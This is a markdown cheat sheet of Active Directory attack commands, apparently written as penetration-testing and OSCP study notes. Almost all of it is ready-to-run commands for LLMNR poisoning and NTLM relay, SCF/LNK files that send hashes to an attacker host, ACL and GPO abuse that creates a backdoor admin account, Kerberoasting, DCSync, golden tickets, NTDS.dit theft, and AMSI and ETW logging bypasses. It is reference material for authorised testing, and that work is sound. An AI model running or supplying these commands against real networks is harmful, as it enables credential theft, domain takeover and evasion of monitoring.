# Active Directory Exploitation

## Table of Contents
- [Enumeration](#enumeration)
  - [Manual Enumeration](#manual-enumeration)
  - [LDAP Enumeration](#ldap-enumeration)
  - [PowerView](#powerview)
  - [BloodHound](#bloodhound)
  - [enum4linux-ng](#enum4linux-ng)
- [NTLM Relay & Poisoning](#ntlm-relay--poisoning)
  - [Responder](#responder)
  - [SMB Relay](#smb-relay)
  - [SCF/LNK File Attack](#scflnk-file-attack)
  - [Inveigh (PowerShell)](#inveigh-powershell)
- [ACL Abuse](#acl-abuse)
  - [AllExtendedRights](#allextendedrights)
  - [GenericAll / GenericWrite](#genericall--genericwrite)
  - [WriteDacl](#writedacl)
  - [ForceChangePassword](#forcechangepassword)
- [GPO Abuse](#gpo-abuse)
  - [SharpGPOAbuse](#sharpgpoabuse)
- [NTLM Theft](#ntlm-theft)
  - [ntlm_theft](#ntlm_theft)
- [Credential Harvesting](#credential-harvesting)
  - [ASREPRoasting](#asreproasting)
  - [Kerberoasting](#kerberoasting)
  - [DCSync](#dcsync)
- [Ticket Attacks](#ticket-attacks)
  - [Golden Ticket](#golden-ticket)
  - [Silver Ticket](#silver-ticket)
  - [Pass the Ticket (PTT)](#pass-the-ticket-ptt)
  - [Overpass the Hash](#overpass-the-hash)
- [Persistence](#persistence)
  - [Shadow Copies](#shadow-copies)
  - [NTDS.dit Extraction](#ntdsdit-extraction)
- [AD CS (Certificate Services)](#ad-cs-certificate-services)
  - [Certipy](#certipy)
- [Defense Evasion](#defense-evasion)
  - [AMSI Bypass](#amsi-bypass)
- [Impacket Tools](#impacket-tools)

---

## Enumeration

### Manual Enumeration

```cmd
net user /domain
net user <USERNAME> /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
```

#### PowerShell AD Module

```powershell
Get-ADUser -Filter *
Get-ADUser -Identity <USERNAME> -Properties *
Get-ADGroup -Filter *
Get-ADGroupMember "Domain Admins"
Get-ADComputer -Filter * -Properties *
```

---

### LDAP Enumeration

> Install: `sudo apt install ldap-utils`

#### Anonymous Bind

```shell
# Check if anonymous bind is allowed
ldapsearch -x -H ldap://$rhost -b "DC=domain,DC=local" -s base namingcontexts

# Enumerate with anonymous bind
ldapsearch -x -H ldap://$rhost -b "DC=domain,DC=local" "(objectClass=*)"
```

#### Authenticated Enumeration

```shell
# List all users
ldapsearch -LLL -x -H ldap://$rhost -D "DOMAIN\user" -w "password" \
  -b "dc=domain,dc=local" -s sub "(objectClass=user)" sAMAccountName

# Users with description (may contain passwords!)
ldapsearch -LLL -x -H ldap://$rhost -D "DOMAIN\user" -w "password" \
  -b "dc=domain,dc=local" -s sub \
  "(&(objectClass=user)(Description=*))" \
  sAMAccountName cn Description memberOf

# Find Domain Admins
ldapsearch -LLL -x -H ldap://$rhost -D "DOMAIN\user" -w "password" \
  -b "dc=domain,dc=local" \
  "(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=local)" \
  sAMAccountName

# Find computers
ldapsearch -LLL -x -H ldap://$rhost -D "DOMAIN\user" -w "password" \
  -b "dc=domain,dc=local" "(objectClass=computer)" \
  name operatingSystem operatingSystemVersion

# Find SPNs (for Kerberoasting)
ldapsearch -LLL -x -H ldap://$rhost -D "DOMAIN\user" -w "password" \
  -b "dc=domain,dc=local" \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# Users with no pre-auth (ASREPRoast)
ldapsearch -LLL -x -H ldap://$rhost -D "DOMAIN\user" -w "password" \
  -b "dc=domain,dc=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName
```

#### Python ldapdomaindump

```shell
# Install
pip install ldapdomaindump

# Dump all AD information
ldapdomaindump -u 'DOMAIN\user' -p 'password' ldap://$rhost -o ldap_dump/

# Creates HTML reports for easy viewing
firefox ldap_dump/domain_users.html
```

---

### PowerView

> https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

```powershell
powershell -ep bypass
. .\PowerView.ps1
```

#### Domain Information

```powershell
Get-NetDomain
Get-NetDomainController
Get-DomainPolicy
```

#### User Enumeration

```powershell
Get-NetUser
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetUser -SPN | select samaccountname,serviceprincipalname
```

#### Group Enumeration

```powershell
Get-NetGroup | select cn
Get-NetGroup "Domain Admins" | select member
Get-NetGroupMember "Domain Admins"
```

#### Computer Enumeration

```powershell
Get-NetComputer
Get-NetComputer | select operatingsystem,dnshostname
```

#### Share Enumeration

```powershell
Find-DomainShare
Find-DomainShare -CheckShareAccess
```

#### ACL Enumeration

```powershell
Get-ObjectAcl -Identity <USERNAME>
Get-ObjectAcl -Identity "Domain Admins" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```

#### Find Local Admin Access

```powershell
Find-LocalAdminAccess
```

---

### BloodHound

#### BloodHound Python Collector

```shell
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns '<RHOST>' -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns '<RHOST>' --dns-tcp -c all --zip
```

#### SharpHound Collector

```cmd
.\SharpHound.exe -c All
.\SharpHound.exe -c All --ldapusername <USERNAME> --ldappassword <PASSWORD>
```

---

### enum4linux-ng

```shell
enum4linux-ng $rhost
enum4linux-ng -A $rhost
enum4linux-ng -u '<USERNAME>' -p '<PASSWORD>' $rhost
```

---

## NTLM Relay & Poisoning

### Responder

> Capture NTLM hashes by poisoning LLMNR, NBT-NS, MDNS

```shell
# Basic capture mode
sudo responder -I eth0

# With WPAD
sudo responder -I eth0 -wF

# Analyze mode only (no poisoning)
sudo responder -I eth0 -A

# Without HTTP/SMB (for relay)
sudo responder -I eth0 -r -d -w
```

**Captured hashes location:** `/usr/share/responder/logs/`

#### Crack NTLMv2

```shell
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

---

### SMB Relay

> Relay captured NTLM authentication to other hosts

#### Prerequisites

- SMB signing must be disabled on target
- User must have local admin on target

#### Check SMB Signing

```shell
nmap --script=smb2-security-mode -p 445 $rhost
crackmapexec smb $rhost --gen-relay-list targets.txt
```

#### Setup Relay

```shell
# 1. Disable HTTP and SMB in Responder
sudo nano /etc/responder/Responder.conf
# Set SMB = Off and HTTP = Off

# 2. Start Responder
sudo responder -I eth0 -r -d -w

# 3. Start ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# Get SAM hashes
impacket-ntlmrelayx -tf targets.txt -smb2support

# Execute command
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# Interactive shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

---

### SCF/LNK File Attack

> Force NTLM authentication when user browses to share

#### SCF File (Shell Command File)

```ini
[Shell]
Command=2
IconFile=\\$lhost\share\test.ico

[Taskbar]
Command=ToggleDesktop
```

Save as `@file.scf` (@ to appear first alphabetically)

#### LNK File

```powershell
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("C:\share\@important.lnk")
$link.TargetPath = "\\$lhost\@important.png"
$link.IconLocation = "\\$lhost\share\icon.ico,0"
$link.Save()
```

#### URL File

```ini
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\$lhost\share\icon.ico
IconIndex=1
```

#### Start Capture

```shell
# Using smbserver to capture
impacket-smbserver share /tmp -smb2support

# Or use Responder
sudo responder -I eth0
```

---

## ACL Abuse

### AllExtendedRights

> Allows password reset, force change password, and read LAPS password

#### Enumerate with BloodHound

Look for: "AllExtendedRights" edge in BloodHound graph

#### Enumerate with PowerView

```powershell
# Find users with AllExtendedRights on other objects
Get-ObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "ExtendedRight" } | select ObjectDN, SecurityIdentifier, ActiveDirectoryRights

# Check specific user
Get-ObjectAcl -Identity "TargetUser" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "ExtendedRight" }
```

#### Reset User Password (Linux)

```shell
# Using net rpc (from Kali)
net rpc password "target_user" 'NewPassword123!' -U "domain/attacker_user%password" -S $dc_ip

# Verify new credentials
netexec winrm $rhost -u 'target_user' -p 'NewPassword123!' -d domain
```

#### Reset User Password (Windows)

```powershell
# Using PowerView
Set-DomainUserPassword -Identity TargetUser -AccountPassword (ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force) -Verbose

# Using net command
net user TargetUser NewPassword123! /domain
```

### GenericAll / GenericWrite

> Full control over object - can reset password, modify attributes, etc.

#### Enumerate

```powershell
Get-ObjectAcl -Identity "TargetUser" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "GenericAll|GenericWrite" }
```

#### Abuse - Add to Group

```powershell
# Add user to Domain Admins
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'AttackerUser' -Verbose
```

#### Abuse - Set SPN for Kerberoasting

```powershell
# Set fake SPN on user for Kerberoasting
Set-DomainObject -Identity TargetUser -SET @{serviceprincipalname='nonexistent/YOURSERVICENAME'}

# Now Kerberoast that user
Get-DomainUser TargetUser | Get-DomainSPNTicket | select -expand Hash
```

### WriteDacl

> Can modify ACL to give yourself more permissions

```powershell
# Grant yourself GenericAll
Add-ObjectAcl -TargetIdentity TargetUser -PrincipalIdentity AttackerUser -Rights All
```

### ForceChangePassword

> Can reset password without knowing current password

```shell
# Using rpcclient
rpcclient -U 'attacker_user%password' $dc_ip
rpcclient $> setuserinfo2 target_user 23 'NewPassword123!'
```

---

## GPO Abuse

### SharpGPOAbuse

> https://github.com/byronkg/SharpGPOAbuse

Abuse Group Policy Object permissions to escalate privileges.

#### Check GPO Permissions

```powershell
# Using PowerView
Get-GPPermission -Name "Default Domain Policy" -All

# Find GPOs where user has GpoEditDeleteModifySecurity
Get-NetGPO | % { Get-ObjectAcl -ResolveGUIDs -Name $_.Name } | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite" }
```

#### Add Local Admin via GPO

```cmd
# Add current user to local Administrators group on all machines affected by GPO
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount CurrentUser --GPOName "Default Domain Policy"

# Force GPO update
gpupdate /force
```

#### Add Immediate Scheduled Task

```cmd
# Create scheduled task that runs as SYSTEM
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add && net localgroup administrators backdoor /add" --GPOName "Vulnerable GPO"
```

#### Add User Rights

```cmd
# Grant SeDebugPrivilege to user
.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeDebugPrivilege" --UserAccount AttackerUser --GPOName "Target GPO"
```

---

## NTLM Theft

### ntlm_theft

> https://github.com/Greenwolf/ntlm_theft

Generate files that trigger NTLM authentication when opened/accessed.

#### Generate All File Types

```shell
python3 ntlm_theft.py -g all -s $lhost -f TriggerFile
```

#### Generate Specific Types

```shell
# LNK file (shortcut) - triggers when folder is browsed
python3 ntlm_theft.py -g lnk -s $lhost -f Important

# SCF file (Shell Command File)
python3 ntlm_theft.py -g scf -s $lhost -f Important

# URL file
python3 ntlm_theft.py -g url -s $lhost -f Important

# Office documents
python3 ntlm_theft.py -g docx -s $lhost -f Important
python3 ntlm_theft.py -g xlsx -s $lhost -f Important
```

#### Upload to Writable Share

```shell
# Upload .lnk to writable SMB share
smbclient -N //target/ShareName
smb: \> put Important.lnk
```

#### Capture with Responder

```shell
# Start Responder before uploading
sudo responder -I tun0

# When user browses share, NTLMv2 hash is captured
```

---

### Inveigh (PowerShell)

> Windows-based LLMNR/NBT-NS poisoner

```powershell
# Import module
Import-Module .\Inveigh.ps1

# Start capturing
Invoke-Inveigh -FileOutput Y -FileOutputDirectory C:\Temp\

# Output to SMB share
Invoke-Inveigh -FileOutput Y -FileOutputDirectory '\\$lhost\share\data'
```

#### Inveigh.ps1 Location

```shell
# Kali
/usr/share/powershell-empire/data/module_source/collection/Invoke-Inveigh.ps1
```

#### Parse Captured Hashes

```shell
# Convert format
dos2unix Inveigh-NTLMv2.txt
cat Inveigh-NTLMv2.txt | sort -u > hashes.txt
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Credential Harvesting

### ASREPRoasting

> Targets users with "Do not require Kerberos preauthentication" enabled

#### Impacket

```shell
impacket-GetNPUsers $domain/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
impacket-GetNPUsers $domain/<USERNAME> -request -no-pass -dc-ip $rhost
```

#### Rubeus

```cmd
.\Rubeus.exe asreproast /nowrap
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast
```

#### Crack

> See [Password Attacks](3.2.Password-Attacks.md#asreproasting) for detailed cracking commands

```shell
hashcat -m 18200 hashes.asreproast /PATH/TO/WORDLIST -r /usr/share/hashcat/rules/best64.rule --force
```

---

### Kerberoasting

> Targets service accounts with SPNs

#### Impacket

```shell
impacket-GetUserSPNs $domain/<USERNAME>:<PASSWORD> -dc-ip $rhost -request
impacket-GetUserSPNs $domain/<USERNAME>:<PASSWORD> -dc-ip $rhost -request -outputfile hashes.kerberoast
```

#### Rubeus

```cmd
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /nowrap
```

#### Crack

> See [Password Attacks](3.2.Password-Attacks.md#kerberoasting) for detailed cracking commands

```shell
hashcat -m 13100 hashes.kerberoast /PATH/TO/WORDLIST -r /usr/share/hashcat/rules/best64.rule --force
```

---

### DCSync

> Requires: Replicating Directory Changes, Replicating Directory Changes All

#### Impacket

```shell
impacket-secretsdump $domain/<USERNAME>:<PASSWORD>@$rhost
impacket-secretsdump -just-dc-user Administrator $domain/<USERNAME>:<PASSWORD>@$rhost
impacket-secretsdump -just-dc-user krbtgt $domain/<USERNAME>:<PASSWORD>@$rhost
```

#### mimikatz

```cmd
lsadump::dcsync /user:<DOMAIN>\Administrator
lsadump::dcsync /user:<DOMAIN>\krbtgt
```

---

## Ticket Attacks

### Golden Ticket

> Requires: krbtgt NTLM hash, Domain SID

#### mimikatz

```cmd
privilege::debug
lsadump::lsa /patch   # Get krbtgt hash
kerberos::purge
kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
misc::cmd
```

#### Impacket

```shell
impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain $domain Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec $domain/Administrator@$rhost -k -no-pass
```

---

### Silver Ticket

> Requires: Service account NTLM hash, Domain SID, Target SPN

#### mimikatz

```cmd
kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<SERVICE_NTLM> /user:<USERNAME> /service:<SERVICE> /target:<TARGET>
kerberos::ptt <TICKET>.kirbi
```

#### Impacket

```shell
impacket-ticketer -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain $domain -spn <SERVICE>/<TARGET> <USERNAME>
export KRB5CCNAME=<USERNAME>.ccache
```

---

### Pass the Ticket (PTT)

#### Export Tickets

```cmd
.\mimikatz.exe
privilege::debug
sekurlsa::tickets /export
```

#### Inject Ticket

```cmd
kerberos::ptt <TICKET>.kirbi
```

#### Rubeus

```cmd
.\Rubeus.exe ptt /ticket:<TICKET>.kirbi
```

#### Linux

```shell
export KRB5CCNAME=<USERNAME>.ccache
impacket-psexec $domain/<USERNAME>@$rhost -k -no-pass
```

---

### Overpass the Hash

> Use NTLM hash to request Kerberos ticket

#### Impacket

```shell
impacket-getTGT $domain/<USERNAME> -hashes :<NTLM_HASH>
export KRB5CCNAME=<USERNAME>.ccache
impacket-psexec $domain/<USERNAME>@$rhost -k -no-pass
```

#### mimikatz

```cmd
sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell
```

---

## Persistence

### Shadow Copies

> Extract NTDS.dit from Domain Controller via Volume Shadow Copy

#### Create Shadow Copy (Requires DA)

```cmd
# Connect to DC as Domain Admin
vssadmin Create Shadow /For=C: /AutoRetry=2

# Note the shadow copy device name (e.g., \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2)
```

#### Extract NTDS.dit

```cmd
# Copy NTDS.dit from shadow copy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak

# Export SYSTEM hive (required for decryption)
reg.exe save hklm\system c:\system.bak
```

#### Transfer & Extract Hashes

```shell
# Setup SMB server on Kali
impacket-smbserver kali . -username kali -password kali -smb2support

# From DC, copy files to attacker
# net use \\$lhost\kali /user:kali kali
# copy c:\ntds.dit.bak \\$lhost\kali\
# copy c:\system.bak \\$lhost\kali\

# Extract hashes
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

### NTDS.dit Extraction

#### Remote via Impacket (Recommended)

```shell
# Extract all hashes remotely using VSS
impacket-secretsdump -just-dc $domain/<USERNAME>:<PASSWORD>@$rhost -use-vss

# Extract specific user
impacket-secretsdump -just-dc-user Administrator $domain/<USERNAME>:<PASSWORD>@$rhost

# With hash authentication
impacket-secretsdump -just-dc $domain/<USERNAME>@$rhost -hashes :<NTLM_HASH>
```

#### NetExec

```shell
# Dump NTDS
nxc smb $rhost -u '<USERNAME>' -p '<PASSWORD>' -d $domain --ntds

# With hash
nxc smb $rhost -u '<USERNAME>' -H '<NTLM_HASH>' -d $domain --ntds
```

---

## AD CS (Certificate Services)

### Certipy

> https://github.com/ly4k/Certipy

#### Find Vulnerable Templates

```shell
certipy-ad find -u '<USERNAME>@$domain' -p '<PASSWORD>' -dc-ip $rhost -vulnerable -stdout
```

#### ESC1: Misconfigured Certificate Templates

```shell
certipy-ad req -ca '<CA>' -username '<USERNAME>@$domain' -password '<PASSWORD>' -target '<CA>' -template '<TEMPLATE>' -upn 'Administrator@$domain'
certipy-ad auth -pfx Administrator.pfx -dc-ip $rhost
```

#### ESC4: Vulnerable Certificate Template Access Control

```shell
certipy-ad template -username '<USERNAME>@$domain' -password '<PASSWORD>' -template '<TEMPLATE>' -save-old
certipy-ad req -ca '<CA>' -username '<USERNAME>@$domain' -password '<PASSWORD>' -target $rhost -template '<TEMPLATE>' -upn 'Administrator@$domain'
certipy-ad auth -pfx Administrator.pfx -dc-ip $rhost
```

#### ESC8: NTLM Relay to AD CS HTTP Endpoints

```shell
certipy-ad relay -target 'http://<CA>'
python3 PetitPotam.py $rhost $domain
certipy-ad auth -pfx dc.pfx -dc-ip $rhost
```

---

## Defense Evasion

### AMSI Bypass

> Bypass Antimalware Scan Interface to run malicious PowerShell

#### Basic Bypass

```powershell
# Memory patching
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Obfuscated version
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

#### Matt Graeber's Method

```powershell
# Force error to disable AMSI
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
```

#### One-liner (Base64)

```powershell
powershell -ep bypass -e WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkA
```

#### Using Invisi-Shell

```powershell
# Run PowerShell without logging or AMSI
.\RunWithPathAsAdmin.bat
.\RunWithRegistryNonAdmin.bat
```

### ETW Bypass

> Disable Event Tracing for Windows

```powershell
[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
```

### Script Block Logging Bypass

```powershell
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
```

---

## Impacket Tools

### impacket-secretsdump

```shell
impacket-secretsdump $domain/<USERNAME>@$rhost
impacket-secretsdump -dc-ip $rhost $domain/<USERNAME>:<PASSWORD>@$rhost
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

### impacket-psexec

```shell
impacket-psexec <USERNAME>@$rhost
impacket-psexec $domain/Administrator@$rhost -hashes :<NTLM_HASH>
```

### impacket-wmiexec

```shell
impacket-wmiexec $domain/<USERNAME>:<PASSWORD>@$rhost
impacket-wmiexec -hashes :<NTLM_HASH> Administrator@$rhost
```

### impacket-smbexec

```shell
impacket-smbexec $domain/<USERNAME>:<PASSWORD>@$rhost
```

### impacket-getTGT

```shell
impacket-getTGT $domain/<USERNAME>:<PASSWORD>
impacket-getTGT $domain/<USERNAME> -hashes :<NTLM_HASH>
export KRB5CCNAME=<USERNAME>.ccache
```

### impacket-GetUserSPNs

```shell
impacket-GetUserSPNs $domain/<USERNAME>:<PASSWORD> -dc-ip $rhost -request
```

### impacket-GetNPUsers

```shell
impacket-GetNPUsers $domain/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast
```

### impacket-addcomputer

```shell
impacket-addcomputer -dc-ip $rhost -computer-name FAKEPC -computer-pass 'Password123!' $domain/<USERNAME>:<PASSWORD>
```

---

## AD Attack Quick Reference

### Attack Flow Based on Access Level

| Access Level | Available Attacks |
|:---|:---|
| **Domain User + DC Reachable** | PowerView enumeration, BloodHound, ACL enumeration, Domain shares, Password spraying, AS-REP Roasting, Kerberoasting |
| **Local Admin on Domain Machine** | Cached credentials (secretsdump), mimikatz, LSASS dump |
| **Domain Admin + DC Reachable** | DCSync, NTDS.dit extraction, Golden Ticket creation |
| **User NTLM Hash** | Pass the Hash, Silver Ticket (if SPN hash), WMI/WinRM/PsExec |

### Hash Attack Reference

| Attack | When to Use | Command |
|:---|:---|:---|
| Pass the Hash | Have NTLM hash, need shell | `impacket-psexec -hashes :<HASH> user@target` |
| Overpass the Hash | Have NTLM, need Kerberos ticket | `sekurlsa::pth /ntlm:<HASH> /run:powershell` |
| Pass the Ticket | Have .kirbi or .ccache ticket | `kerberos::ptt ticket.kirbi` |
| Silver Ticket | Have service account hash | `kerberos::golden /service:http /rc4:<HASH>` |
| Golden Ticket | Have krbtgt hash (persistence) | `kerberos::golden /krbtgt:<HASH> /ptt` |

---

## See Also

- **[Password Attacks](3.2.Password-Attacks.md)** - Credential cracking, extraction, and hash attacks
- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - PsExec, WMI, WinRM, PTH, PTT techniques
- **[Pivoting & Tunneling](../5.Lateral-Movement/5.2.Pivoting-Tunneling.md)** - Chisel, Ligolo-ng, ProxyChains
- **[Windows Privilege Escalation](../4.Privilege-Escalation/4.1.Privilege-Escalation-Windows.md)** - SeImpersonate, SeBackup, Registry Credentials
- **[OSCP Exam Guide - AD Methodology](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md#ad-set-step-by-step-methodology)** - Complete AD attack workflow

---

### External Resources

- [WADComs - Interactive AD Cheatsheet](https://wadcoms.github.io)
- [The Hacker Recipes - AD Recon](https://www.thehacker.recipes/ad/recon)
- [The Hacker Recipes - AD Movement](https://www.thehacker.recipes/ad/movement)
- [adPEAS - AD Enumeration Script](https://github.com/61106960/adPEAS)
- [Invoke-ADEnum](https://github.com/Leo4j/Invoke-ADEnum)
- [NetExec Wiki](https://github.com/Pennyw0rth/NetExec)
- [BloodHound.py (Python collector)](https://github.com/dirkjanm/BloodHound.py)
